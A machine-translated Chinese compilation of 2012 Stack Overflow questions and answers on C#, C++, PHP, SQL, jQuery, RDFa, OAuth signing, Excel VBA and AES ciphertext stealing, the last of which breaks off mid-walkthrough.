> 时间：2012-09-08T05:31:31.733

有很多链接其中一些

[http://dotnetguts.blogspot.in/2012/01/jquery-ajax-examples-by-calling-aspnet.html](http://dotnetguts.blogspot.in/2012/01/jquery-ajax-examples-by-calling-aspnet.html)

[http://www.codeproject.com/Articles/17203/Using-jQuery-for-AJAX-in-ASP-NET](http://www.codeproject.com/Articles/17203/Using-jQuery-for-AJAX-in-ASP-NET)

[http://www.csharpbydesign.com/2008/06/aspnet-ajax-and-jquery.html](http://www.csharpbydesign.com/2008/06/aspnet-ajax-and-jquery.html)

# c# - C# 中的 LinkLabel 在双击时复制其文本

> ID：12328292
> 
> 赞同：2
> 
> 时间：2012-09-08T05:30:55.287
> 
> 标签：c#, winforms, linklabel

当我在 WindowsForms 中双击 LinkLabel 时，它会复制其文本；我怎样才能防止这种情况？

顺便说一句，这是一个 .Net 2.0 应用程序，如果这有什么不同的话。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:35:12.817

您始终可以使用以下命令清除剪贴板：

```
Clipboard.Clear(); 
```

更新 ：

您可以在鼠标双击事件中使用此代码。

试试这个 ：

```
private void linkLabel1_MouseDoubleClick(object sender, MouseEventArgs e)
    {
        Clipboard.Clear();
    } 
```

更新 2：

使用以下代码，它不会复制可链接的值，并且它还保留您的剪贴板。您必须将这些代码与鼠标输入事件和鼠标双击事件一起使用。

试试这个 ：

```
public string str;

    private void linkLabel1_MouseEnter(object sender, EventArgs e)
    {
        str = Clipboard.GetText();
        linkLabel1.MouseDoubleClick+=new MouseEventHandler(linkLabel1_MouseDoubleClick);
    }

    private void linkLabel1_MouseDoubleClick(object sender, MouseEventArgs e)
    {
        Clipboard.SetText(str);
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T06:08:13.003

似乎这种行为是内置在[LinkLabel](http://msdn.microsoft.com/en-us/library/system.windows.forms.linklabel.aspx)中的，并且没有办法覆盖它。

测试显示剪贴板在触发 MouseDoubleClick 事件时已经更改。

FWIW，我从来不需要这个控件——一个带有一些样式和使用 MouseEnter/MouseLeave 事件的常规标签在许多项目中为我提供了很好的服务。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-03T13:32:55.490

您可以做的是创建自己的标签并将其从 Control 派生为公共类`MyLabel : Control`，然后自己在其中绘制文本

```
受保护的覆盖无效 OnPaint(PaintEventArgs e)
{
        SolidBrush TextBrush = new SolidBrush(this.ForeColor);
        TextRenderer.DrawText(e.Graphics, this.Text, this.Font, this.ClientRectangle, this.ForeColor, TextFormatFlags.Left | TextFormatFlags.VerticalCenter);
}

```

# c++ - C++ - 在通过标记器读取文件行时删除或跳过引号字符

> ID：12328293
> 
> 赞同：0
> 
> 时间：2012-09-08T05:31:03.290
> 
> 标签：c++, string, tokenize

我有一个 csv 文件，其中包含以下记录：

> 837478739*"EP" *1* "3FB2B464BD5003B55CA6065E8E040A2A"*"F"*21*15*"NH"*"N" *0* *-1*"-1"*0*0**-1*223944*-1*"23 " *1* "-1" *"* -1" "78909" *"* -1" " -1" *"* -1" " -1""- *1"* "- 1" "- *1"* "- 1" "- *1"* " -1" *"-1"* "-1" *"-1"* "74425" *"26"* "-1"*"-1"*1*1*69*23.58*0*0*0*0*"MC"

该文件有很多记录，所以我需要一种快速的方法来分解行并将这些部分中的每一个推回一个向量。我选择 tokenizer 的主要原因是我听说了很多关于它的性能。我有一个功能：

```
void break(){
   //using namespace boost;
   string s = "This is a , test '' file";
   boost::tokenizer<> tok(s);
   vector<string> line;
   for(boost::tokenizer<>::iterator beg=tok.begin();beg!=tok.end();++beg){
       line.push_back(*beg);
   }
   cout << line[3] << "  and  " << line[5] << endl;
} 
```

这样我就可以得到句子的每个部分，而忽略所有不是字母的东西。标记器是否能够读取我拥有的记录并通过“*”分隔符解析它们并从字符串中删除引号？引号之间不会有任何特殊字符，我只需要删除引号。我试图阅读 tokenizer 文档，但没有任何结果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:22:45.437

您可以使用[regex_replace](http://www.cplusplus.com/reference/std/regex/match_replace/)。

“break”是关键词。您不应该将其用作函数名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T07:41:39.180

您需要为您的 Tokenizer 分配另一个 TokenizerFunc 以不同方式解析字符串，默认解析空格和标点符号

[http://www.boost.org/doc/libs/1_37_0/libs/tokenizer/tokenizerfunction.htm](http://www.boost.org/doc/libs/1_37_0/libs/tokenizer/tokenizerfunction.htm)

# iphone - 从我的 iphone 应用程序中使用的 iTunes 库中删除/隐藏文件

> ID：12328294
> 
> 赞同：0
> 
> 时间：2012-09-08T05:31:25.517
> 
> 标签：iphone, objective-c, ios, itunes

我制作了一个 iphone 应用程序，在其中我从 iTunes 库中获取歌曲并显示在表格中，并将它们存储在我的文档目录中。现在我想把它保密..所以我想从 iTunes 库中删除选定的文件，这样它就不会显示在列表中。谁能帮我做到这一点？代码：

```
importableDoc = [NSMutableArray array];
// Get public docs dir
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
NSString *publicDocumentsDir = [paths objectAtIndex:0];   

// Get contents of documents directory
NSError *error;
NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:publicDocumentsDir error:&error];
if (files == nil) {
    NSLog(@"Error reading contents of documents directory: %@", [error localizedDescription]);
}

// Add all mp3 files to a list    

for (NSString *file in files) {
    if ([file.pathExtension compare:@"mp3" options:NSCaseInsensitiveSearch] == NSOrderedSame) 
    {        

        NSString *fullPath = [publicDocumentsDir stringByAppendingPathComponent:file];
                //NSLog(@"fullPath : %@",fullPath);

        [importableDoc addObject:fullPath];
    }
  }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T05:49:05.937

对不起，但看起来你运气不好。来自[媒体播放器框架参考](http://developer.apple.com/library/ios/#documentation/mediaplayer/reference/MediaPlayer_Framework/_index.html)：

> 媒体播放器框架提供了播放电影、音乐、音频播客和有声读物文件的设施。该框架还允许您的应用程序访问 iPod 库，让您可以在桌面上查找和播放从 iTunes 同步的基于音频的媒体项目。**iPod 库访问是只读的**。

作为替代方案，`MPMediaPickerController`您可以使用a`MPMediaQueries`来显示您自己的可用歌曲自定义列表，但这仍然没有让您有机会从用户 iPod 库中实际删除曲目。

# c++ - 在 c++11 中复制常量大小数组的最简洁方法

> ID：12328301
> 
> 赞同：53
> 
> 时间：2012-09-08T05:33:02.007
> 
> 标签：c++, arrays, optimization, c++11, copy

我经常发现自己想要复制具有恒定大小的数组的内容，我通常只写以下内容：

```
float a[4] = {0,1,2,3};
float b[4];

for(int i=0; i<4; i++){
    b[i]=a[i];
} 
```

最近，我正在编写一个用于教育目的的线性微积分库，我想知道是否有更好的方法来做到这一点。

我首先想到的是使用 memcpy：

```
memcpy(b, a, sizeof(float) * 4); 
```

但这对我来说似乎很像 c 并且容易出错。我喜欢在编译时出现错误，对于具有非平凡复制构造函数的数据类型，或者如果我忘记与 sizeof(datatype) 相乘，这可能会变得很难看。

由于我正在编写一个我将大量使用的数学库，因此性能对我来说非常重要。今天的编译器是否足够聪明，能够理解第一个示例只是复制一块内存并将其优化为与第二个解决方案一样高效？

也许标准库中有一个可以帮助我的函数？c++11有什么新东西吗？还是我应该只创建一个宏或模板函数？

* * *

## 回答 #1

> 赞同：80
> 
> 时间：2012-09-08T05:41:51.857

如果你使用`std::array`而不是内置数组（你应该这样做），它变得非常简单。复制数组与复制任何其他对象相同。

```
std::array<float,4> a = {0,1,2,3};
std::array<float,4> b = a; 
```

* * *

## 回答 #2

> 赞同：54
> 
> 时间：2012-09-08T05:39:01.207

**C++03 方式**

使用[`std::copy()`](http://www.cplusplus.com/reference/algorithm/copy/)：

```
float a[4] = {0,1,2,3};
float b[4];

std::copy(a,a + 4, b); 
```

这几乎是干净的。

**C++11 方式**

```
std::copy(std::begin(a), std::end(a), std::begin(b)); 
```

**如果你可以使用 std::array**

和`std::array`你一起做简单的任务：

```
std::array<float,4> a = {0,1,2,3};
auto b = a; 
```

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2012-09-08T10:22:04.930

对于对 C++03（以及 C）解决方案感兴趣 - 始终使用包含数组的结构而不是单独的数组：

```
struct s { float arr[5]; }; 
```

默认情况下，结构是可复制的。

已经提到了它在 C++11 中的等价物，`std::array<float,5>;`

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-08-30T11:25:18.720

下面的方法也适用于普通数组以及 std:array。

```
float a[4] = {0,1,2,3};
float b[4];

std::copy(std::begin(a), std::end(a), b); 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-09-08T07:22:21.563

```
#include <algorithm>
std::copy_n(a, 4, b) 
```

# image - Magento：在订单电子邮件中显示产品图片

> ID：12328302
> 
> 赞同：3
> 
> 时间：2012-09-08T05:33:02.663
> 
> 标签：image, magento, caching, product

为了在订单电子邮件中显示产品图片，我在 template/email/order/items/order/default.phtml 中编写了以下代码

```
<?php 
$_product = Mage::getModel('catalog/product')
                ->setStoreId($_item->getOrder()->getStoreId())
                ->load($_item->getProductId());
?> 
<img src="<?php echo Mage::helper('catalog/image')
                         ->init($_product, 'image')
                         ->constrainOnly(TRUE)
                         ->keepAspectRatio(TRUE)
                         ->keepFrame(FALSE)
                         ->resize(50,50); ?>" 
alt="<?php echo $_item->getName() ?>" /> 
```

它工作正常。它在订单电子邮件中显示调整大小的产品图像。

但是，我有一个问题。

> 产品图像是从**media/catalog/product/cache** 目录中获取的。而且，如果我们从 Magento Admin （**系统 > 缓存管理）****刷新图像缓存**，那么之前显示的产品图像不会显示在订单电子邮件中。这是因为刷新图像缓存会清除**media/catalog/product/cache**目录中的所有缓存图像。

 ****这个问题的适当解决方案是什么？在订单电子邮件中显示产品图片是个好主意吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-08T11:10:21.603

试试这个：

```
<img src="<?php echo Mage::getModel('catalog/product_media_config')
                 ->getMediaUrl($_product->getThumbnail()); ?>" 
 alt="<?php echo $_item->getName() ?>" /> 
```

您可以使用 getSmallImage()、getThumbnail() 获取产品的不同图像。****

# c++ - 矢量读取特定行

> ID：12328303
> 
> 赞同：0
> 
> 时间：2012-09-08T05:33:04.363
> 
> 标签：c++, class, vector

我有一个文本文件，其中包含节目的名称和主演的人。

我需要在一个可以输入演员的类中创建一个向量，它将输出电影。

但我不想将整个条目读入向量中以节省内存。

我怎样才能做到这一点，以便我可以阅读包含以下内容的 txt 文件，然后找到演员姓名，例如`Min, Jun So`它将找到两个实例，然后将两部电影读入向量并输出它？

只是也许这样做的代码布局会很棒。只是为了让我开始。

```
Min, Elia
    Starlight Inn (2010)  [Skyler]  <4>

Min, Jun So
    "Joseon X-Files - Secret Book" (2010) {Ghosts of Yidu (#1.6)}  [Choi Eui Shin]  <5>

Min, Jung So
    "Mischievous Kiss" (2010)  [Oh Ha Ni]

Min, Xiao
    Little Sister (2010)  [Mei Mei]  <2> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:51:50.180

试试这个示例代码：

```
#include <string>
#include <iostream>
#include <fstream>
#include <vector>
using namespace std;

int main()
{
    std::ifstream file( "test.txt" ) ;
    std::string search_str = "Elia" ;
    std::string line ;
    int line_number = 0 ;
    std::vector<string> finds;
    finds.resize(100);

    while( std::getline( file, line ) )
    {
        ++line_number ;
        if( line.find(search_str) != std::string::npos )
        {
            std::cout << "line " << line_number << ": " << line << '\n' ;
            finds.push_back(line);
            std::getline( file, line );
            finds.push_back(line);
        }
    }

    for (int i=0;i<finds.size();i++)
    {
        std::cout<<finds[i]<<"\n";
    }

    return 0;
} 
```

输入：`Elia`

输出：

```
Min, Elia
    Starlight Inn (2010)  [Skyler]  <4>
Press any key to continue 
```

# php - 在 PHP (SimpleXML) 中处理非常复杂的 XML 文件

> ID：12328306
> 
> 赞同：1
> 
> 时间：2012-09-08T05:33:37.163
> 
> 标签：php, xml, object, xpath, simplexml

我已经在 PHP 中加载了一个带有“simplexml_load_file”的 XML 文件，现在我想从中读取一些元素以使用 PHP 将它们打印出来。我发现的所有方法都没有成功，因为我的 XML 文件可能太复杂了……我发现的最好的东西如下：

> 只是想添加一篇关于如何从 SimpleXMLElement 中提取值的帖子。它不像你想象的那么简单。因为它是一个复杂的对象，所以您不能直接访问该元素。这是表示 SimpleXmlElement 的 var_dump 的数据示例
> 
> array(1) { [0]=> object(SimpleXMLElement)#13 (2) { ["@attributes"]=> array(1) { ["name"]=> string(5) "title" } [0 ]=> string(19) "PHP 技术手册" } }
> 
> 如果要提取书名，则必须将指定的元素转换为这样的字符串。$newTitle = (string) $title[0];
> 
> $title 变量是您使用 simplexml_load_string 从 xml 文档中提取的 SimpleXMLElement。要最初从 xml 文档中访问 title 元素，您可以使用 xpath 这样做。$title = $doc->xpath('str[@name="title"]');
> 
> 希望这可以帮助那里的人。

我尝试使用“$title = $doc->xpath('str[@name="title"]');” 用我自己的 XML 文件将其替换为我自己的元素，但随后出现 PHP 错误：

> 遇到 PHP 错误严重性：通知消息：数组到字符串转换文件名：views/welcome_message.php 行号：79

这是我的代码：

```
<?php
    if (file_exists('data.xml')) {
        $xml = simplexml_load_file('data.xml');

    $title = $xml->xpath('str[@name="name"]');
    echo $title;

    } else {
        exit('Failed to open test.xml.');
    }
    ?> 
```

这是我非常混乱的 xml 文件的一小部分摘录：

> SimpleXMLElement 对象（[文件夹] => SimpleXMLElement 对象（[@attributes] => 数组（[名称] => ABC）[文件] => SimpleXMLElement 对象（[@attributes] => 数组（[名称] => DEF [大小] => 123 [创建时间] => 03.09.2012 16:36:59 [最后写入时间] => 06.09.2012 10:46:39 [id3v2] => 1 [v2-tag-PRIV] = > XMP ; WM/MediaClassSecondaryID; WM/MediaClassPrimaryID ?}`?#??K??H?*(D; WM/Provider AMG; WM/WMContentID ???E?@??B????; WM/WMCollectionID ?Yd??B??N5 ?; WM/WMCollectionGroupID ]?????N?????^e; WM/UniqueFileIdentifier AMG a _ id = R 2 0 5 6 3 8 9 ; AMG p _ id = P 2 6 4 5 ; AMG t _ id = T 2 2 1 6 6 0 0 3 [v2-track] => 2 [v2-song-title] => FGH [v2-album] => IJK [ v2-流派] => (12) [v2-tag-TPUB] => LMN [v2-tag-TYER] =>1997 [v2-tag-TPE2] => OPQ [v2-composer] => RST [v2-artist] => UVW [id3v1] => 1 [song-title] => XYZ [artist] => ARTIST1 [album- title] => TITLE1 [year] => 1997 [comment] => [track] => 2 [genre] => Other [mpeg-version] => 1 [mpeg-layer] => 3 [bitrate] => 320Kbps [采样率] => 48000Hz [通道模式] => JointStereo ) )

为什么 [@attributes] 中有一个“@”，我该如何处理？如何从不同元素中获取信息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T05:36:16.323

当我必须处理“繁重”的 dom 操作时，我总是使用[simple_html_dom](http://simplehtmldom.sourceforge.net/)。试试看，也许有帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T12:50:34.733

[SimpleXML`->xpath()`函数](http://uk3.php.net/manual/en/simplexmlelement.xpath.php)返回一个 SimpleXML 对象数组，每个对象代表一个与 XPath 表达式匹配的元素或属性。

因此，首先，您需要遍历结果（或使用 获取第一个结果`[0]`）；其次，您需要对找到的 SimpleXML 对象做一些事情。如果它是一个属性，`(string)$sx_attrib`会给你它的值；否则，您需要进行进一步的操作。

最后，不要在 SimpleXML 对象上使用`var_dump`、`print_r`或`var_export`，因为它们不是“真正的” PHP 对象，而是非 PHP 数据的包装器。改为使用[`simplexml_dump`](https://github.com/IMSoP/simplexml_debug)。

# sql - 计数比较的查询优化

> ID：12328308
> 
> 赞同：1
> 
> 时间：2012-09-08T05:34:47.587
> 
> 标签：sql, postgresql, optimization, select

我有以下要优化的查询。

```
EXPLAIN
select clb.f_name, clb.l_name, noofbooks 
from (
    select f_name, l_name, count(*) as noofbooks from 
    customer natural join loaned_book
    group by f_name, l_name
) as clb
where 3 > (
    select count(*) from (
        select f_name, l_name, count(*) as noofbooks
        from customer natural join loaned_book
        group by f_name, l_name
    ) as clb1
    where clb.noofbooks<clb1.noofbooks
)
order by noofbooks desc; 
```

本质上，这个查询试图找到“前三”的计数（包括平局，即不限于 3）。客户借出的书籍。问题与必须在查询中进行的计数有关。是否可以使用第一个查询中的计数值来减少第二个查询中的选定行而不重新计算所有行？

这是一个家庭作业，所以我不期待一个直接的答案。任何指针将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:05:09.197

看看[`dense_rank`](http://www.postgresql.org/docs/9.1/static/functions-window.html)窗口函数。您想要所有密集等级为 3 或更少的行。

# javascript - Jquery ui sortables不起作用

> ID：12328309
> 
> 赞同：0
> 
> 时间：2012-09-08T05:34:47.217
> 
> 标签：javascript, jquery, jquery-ui, jquery-ui-sortable

我正在使用 jquery ui 来制作一个可排序的列表，但它不起作用，我就是不明白为什么。ul 元素接收到类 'ui-sortable' 但没有任何反应。

我做了一个例子，因为原始的 js 有更多不相关的对象。

例子在[这里](http://jsfiddle.net/Kx5A9/2/)。要使其“工作”，只需单击其中带有“editar”的按钮。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-10T02:01:14.853

在这个问题上浪费了整个周末之后，我最终明白了发生了什么。正如[这条评论](http://api.jquery.com/clone/#comment-42445276)所指出的：当使用 .html() 在 dom 中添加元素时，它会丢失其事件和数据，这就是我无法克隆以前可排序的 ul 的原因。

我解决了我的问题，确保列表在应用可排序方法之前已经在 dom 中。

Fabrício 和 Guy，非常感谢您的帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-24T21:27:58.837

我有同样的问题。就我而言，这只是查找和删除重复的 jQuery 包含`<script>`标签的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T06:58:24.223

如果您将小提琴切换为使用 JQuery 1.7.2 和 JQuery ui 1.8.18，它可以正常工作。可能是兼容性问题。你可以[在我的小提琴版本中看到它](http://jsfiddle.net/Kx5A9/12/)

我看到的错误是

```
Uncaught TypeError: Object function ( selector, context ) {
        // The jQuery object is actually just the init constructor 'enhanced'
        return new jQuery.fn.init( selector, context, rootjQuery );
    } has no method 'curCSS' jquery-ui.js:84
(anonymous function) jquery-ui.js:84
(anonymous function) jquery-git.js:5473
jQuery.extend.grep jquery-git.js:709
winnow jquery-git.js:5472
jQuery.fn.extend.filter jquery-git.js:5271
$.fn.extend.scrollParent jquery-ui.js:83
$.widget._mouseStart jquery-ui.js:3026
$.widget._mouseMove jquery-ui.js:677
$.widget._mouseDown._mouseMoveDelegate jquery-ui.js:650
jQuery.event.dispatch jquery-git.js:3060
jQuery.event.add.elemData.handle.eventHandle 
```

# schema.org - 带有 schema.org 博客架构的 RDFa

> ID：12328312
> 
> 赞同：4
> 
> 时间：2012-09-08T05:35:31.393
> 
> 标签：schema.org, rdfa

我无法确定我是否使用 RDFa 和 schema.org 博客类型正确完成了操作。我的博客曾经有一个看起来像这样的帖子列表：

```
<h2><a href="essays/why-orm-divides-us.html">Why ORM Divides Us</a></h2>
<h2><a href="essays/heretic-calculus.html">A Heretical Calculus</a></h2> 
```

在尝试使用 RDFa 信息（特别是[Blog](http://schema.org/Blog)和[BlogPosting](http://schema.org/BlogPosting)类型）来扩充它时，我想出了这个：

```
<div vocab="http://schema.org/" typeof="Blog">
  <h2 property="blogPosting" typeof="BlogPosting" resource="essays/why-orm-divides-us.html">
    <a property="url" href="essays/why-orm-divides-us.html">
      <span property="name">Why ORM Divides Us</span>
    </a>
  </h2>
  <h2 property="blogPosting" typeof="BlogPosting" resource="essays/heretic-calculus.html">
    <a property="url" href="essays/heretic-calculus.html">
      <span property="name">A Heretical Calculus</span>
    </a>
  </h2>
  ... 
```

据我使用 Google Rich Snippets Testing Tool 可以判断，这看起来解析正确，但我无法确定。我还有另外两个尝试：

```
<div vocab="http://schema.org/" typeof="Blog">
  <h2 property="blogPosting" typeof="BlogPosting" resource="essays/why-orm-divides-us.html">
    <a href="essays/why-orm-divides-us.html" property="name">Why ORM Divides Us</a>
  </h2>
  <h2 property="blogPosting" typeof="BlogPosting" resource="essays/heretic-calculus.html">
    <a href="essays/heretic-calculus.html" property="name">A Heretical Calculus</a>
  </h2>
  ...

<div vocab="http://schema.org/" typeof="Blog" rel="blogPosting">
  <h2 typeof="BlogPosting" resource="essays/why-orm-divides-us.html">
    <a property="url" href="essays/why-orm-divides-us.html">
      <span property="name">Why ORM Divides Us</span>
    </a>
  </h2>
  <h2 typeof="BlogPosting" resource="essays/heretic-calculus.html">
    <a property="url" href="essays/heretic-calculus.html">
      <span property="name">A Heretical Calculus</span>
    </a>
  </h2>
  ... 
```

所以我要求提供几条信息：

1.  你如何判断你是否符合这些模式之一？
2.  我的哪个选择是正确的，为什么？
3.  为什么我在链接上时似乎需要直接指定资源？
4.  为什么`<a>`RDFa 演示工具和 Google Rich Snippets 测试工具中的标签解析如此不同？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T15:51:55.177

您的第一个片段是正确的，我建议使用它。第二个不正确，因为 property="name" 将针对 href 值，所以不要使用那个。第三个也是正确的，它使用了 RDFa 的一个更高级的特性，称为链接（通过 rel 属性）。如果您愿意，使用它是完全有效的，谷歌也理解它。

1.  我不知道有任何官方 schema.org 验证器，但 Google Rich Snippet 有时会告诉您是否有问题（但并非总是如此）。您还可以使用[http://validator.w3.org/nu/](http://validator.w3.org/nu/)和[http://www.w3.org/2012/pyRdfa/Validator.html](http://www.w3.org/2012/pyRdfa/Validator.html)验证您的 HTML + RDFa 标记。
2.  你的第一个和第三个是正确的，第二个是错误的（见上文）。我会推荐第一个。
3.  好吧，链接的 url 有两个用途，首先它用于识别您在网络上的对象，它还明确用于 schema.org 所需的“url”属性。虽然第二个是 schema.org 特定的属性。
4.  这是 Google 在 RDFa 语法本身之上添加的东西，纯 RDFa 解析器不会返回像这样分组的值和 href。我猜谷歌这样做是为了方便，但我同意这可能会让人感到困惑。

# php - 如何验证签名/消费者秘密

> ID：12328316
> 
> 赞同：0
> 
> 时间：2012-09-08T05:36:55.687
> 
> 标签：php, oauth

我正在创建自己的“Oauth 服务提供商‘系统’”，但我有疑问..

我应该如何验证`oauth_signature`/ `consumer_secret`.. 我基本上不明白。

我的问题是：

1.  当`oauth_signature`参数被发送到服务提供商时，它是已经使用 signature_method 散列还是以“明文”形式发送的。
2.  当收到它时，我应该使用 signature_method 对它（或不基于 Q1 ）进行哈希处理，然后查看它是否与数据库中的匹配？
3.  使用[hash_hmac](http://php.net/manual/en/function.hash-hmac.php)时参数应该是什么？我的意思是，数据是什么，函数中的秘密是什么

对不起，如果它很复杂或者我是一个大菜鸟 - 我一直在寻找答案，但找不到任何明确的答案。

注意：我没有使用 PHP 的 Oauth 库/类

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T18:54:56.620

1.  好吧，如果`oauth_signature_method`说`PLAINTEXT`，值`oauth_signature`只是简单的签名基本字符串。如果它说`HMAC_SHA1`或其他密码散列算法，客户端使用此算法使用他的秘密对签名基础字符串进行散列，然后将此散列作为`oauth_signature`参数发送。

2.  由于客户端已经对基本字符串进行了哈希处理，您可以将发送的值与您在服务器端计算的值进行比较。

3.  `data`是您构造的[签名基本字符串](https://www.rfc-editor.org/rfc/rfc5849#section-3.4.1)，`secret`是[这种格式](https://www.rfc-editor.org/rfc/rfc5849#section-3.4.2)的客户端和令牌的秘密：

    ```
    {CONSUMER_SECRET}&{OAUTH_TOKEN_SECRET} 
    ```

# excel - How to run an equation along whole column in excel vba

> ID：12328317
> 
> 赞同：0
> 
> 时间：2012-09-08T05:36:55.770
> 
> 标签：excel, vba

I want to run an excel vba which will go down column E and upon finding the value = "capa" will go two cell below, calculate the hex2dec value of that cell, present it by the cell with the value "capa" in column F and continue to search down column E. So far I've came with the below but it doesn't work:

```
 For Each cell In Range("E:E")
     If cell.Value = "Capa" Then
           ActiveCell.Offset.FormulaR1C1 = "=HEX2DEC(R[2]C[-1])"
     End If
Next cell 
```

Thanks!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T08:00:00.393

这样的事情怎么样？

这将在 E 卷中搜索“Capa”，如果找到，将使用 E 列中“Capa”正下方的值将公式放在 F 列中

```
Sub CapaSearch()
    Dim cl As Range

    For Each cl In Range("E:E")
        If cl.Value = "Capa" Then
            cl.Offset(0, 1).Formula = "=HEX2DEC(" & cl.Offset(1, 0) & ")"
        End If
    Next cl
End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T09:33:51.217

你真的想限制循环，这样你就不会循环整个工作表（Excel 2007+ 中的 1,000,000+ 行）
此外，将源数据复制到变量数组也会加快速度。

尝试这个

```
Sub Demo()
    Dim dat As Variant
    Dim i As Long
    With ActiveSheet.UsedRange
        dat = .Value
        For i = 1 To UBound(dat, 1)
            If dat(i, 6 - .Column) = "Capa" Then
                .Cells(i, 7 - .Column).FormulaR1C1 = "=HEX2DEC(R[2]C[-1])"
            End If
        Next
    End With
End Sub 
```

# php - PHP implementing Ciphertext Stealing (CTS) with CBC

> ID：12328320
> 
> 赞同：3
> 
> 时间：2012-09-08T05:37:15.967
> 
> 标签：php, cryptography, aes, lockbox-3, cbc-mode

I have been trying to implement Ciphertext Stealing(CTS) in PHP for CBC.

Referring below two links

[How can I encrypt/decrypt data using AES CBC+CTS (ciphertext stealing) mode in PHP?](https://stackoverflow.com/questions/10411036/how-can-i-encrypt-decrypt-data-using-aes-cbccts-ciphertext-stealing-mode-in-p)

and

[http://en.wikipedia.org/wiki/Ciphertext_stealing](http://en.wikipedia.org/wiki/Ciphertext_stealing)

I am confused and stuck on the last and simplest step of XOR. I know this is silly but having tried all the combinations, i don't know what am i missing. Code follows.

```
// 1\. Decrypt the second to last ciphertext block, using zeros as IV.       
$second_to_last_cipher_block = substr($cipher_text, strlen($cipher_text) - 32, 16);     
$second_to_last_plain = @mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $second_to_last_cipher_block, MCRYPT_MODE_CBC);

// 2\. Pad the ciphertext to the nearest multiple of the block size using the last B-M 
//    bits of block cipher decryption of the second-to-last ciphertext block.
$n = 16 - (strlen($cipher_text) % 16);
$cipher_text .= substr($second_to_last_plain, -$n);

// 3\. Swap the last two ciphertext blocks.
$cipher_block_last = substr($cipher_text, -16);
$cipher_block_second_last = substr($cipher_text, -32, 16);
$cipher_text = substr($cipher_text, 0, -32) . $cipher_block_last . $cipher_block_second_last;

// 4\. Decrypt the ciphertext using the standard CBC mode up to the last block.
$cipher = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');
mcrypt_generic_init($cipher, $key, $iv);
$plain_text = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $cipher_text, MCRYPT_MODE_CBC , $iv);

// 5\. Exclusive-OR the last ciphertext (was already decrypted in step 1) with the second last ciphertext.
//    ???
//    echo $??? ^ $???; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-08T11:09:01.713

我发现具体的用例对理解算法非常有帮助。这里有 2 个用例和一个分步演练。

# 两个用例的起点。

这些用例假设您正在解密消息，使用 AES-256 和 CBC 链接模式和用于块量化的密文窃取。为了生成这些用例，我使用了 Delphi 2010 编译器和 TurboPower LockBox3 库（SVN 修订版 243）。在下文中，我使用这样的符号......

```
IV := [16] 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
```

...意味着一些名为“IV”的变量被分配为等于 16 个字节的数组。最左边的字节是数组的 Least Signficant（最低地址）字节的呈现，最右边的字节是最重要的字节。这些字节是用十六进制写的，例如，如果一个人放...

```
X := [2] 03 10 
```

...这意味着LSB是3，MSB是16。

# 用例一

1.  让 AES-256 32 字节压缩密钥（在 AES 标准中定义）为...

    ```
    key = [32] 0D EE 8F 9F 8B 0B D4 A1 17 59 FA 05 FA 2B 65 4F 23 00 29 26 0D EE 8F 9F 8B 0B D4 A1 17 59 FA 05 
    ```

    使用 TurboPower LockBox 3，可以通过将 TCodec 组件的密码 ('UTF8Password') 属性设置为...

    ```
    password = (UTF-8) 'Your lips are smoother than vasoline.' 
    ```

2.  要发送的明文消息将是

    ```
    Message = (UTF-8) 'Leeeeeeeeeroy Jenkins!' 
    ```

    编码为 22 字节长。AES-256 的块大小为 16 字节，因此长度介于 1 到 2 个块之间。

3.  让 IV 为 1。（旁白：在 Delphi 方面，这可以通过设置来实现

    ```
    TRandomStream.Instance.Seed := 1; 
    ```

    就在加密之前）。因此，要由 PHP 解密的密文消息将是（带有 8 字节 IV 前面的 la LockBox3）......

    ```
    ciphertext = [30] 01 00 00 00 00 00 00 00 17 5C C0 97 FF EF 63 5A 88 83 6C 00 62 BF 87 E5 1D 66 DB 97 2E 2C
    (base64 equivalent ='AQAAAAAAAAAXXMCX/+9jWoiDbABiv4flHWbbly4s') 
    ```

    将其分解为IV，第一个密文块（c [0]）和最后一个（部分）密文块（c [1]）......

    ```
    IV = [16] 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    c[0] = [16] 17 5C C0 97 FF EF 63 5A 88 83 6C 00 62 BF 87 E5
    c[1] = [6] 1D 66 DB 97 2E 2C 
    ```

4.  现在让我们通过密文窃取来进行解密。

    *   简历：= IV

        ```
        CV = [16] 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
        ```

    *   一般来说，对于第 n 个块（除了最后 2 个块），我们正常的 CBC 算法是......

        ```
        m[n]    := Decrypt( c[n]) XOR CV;
        CV[n+1] := c[n] 
        ```

        在哪里：

        *   m 是输出明文块；
        *   Decrypt() 表示对该块进行 AES-256 ECB 解密；
        *   CV 是我们的进位向量。链接模式定义了这如何从一个块到另一个块变化。
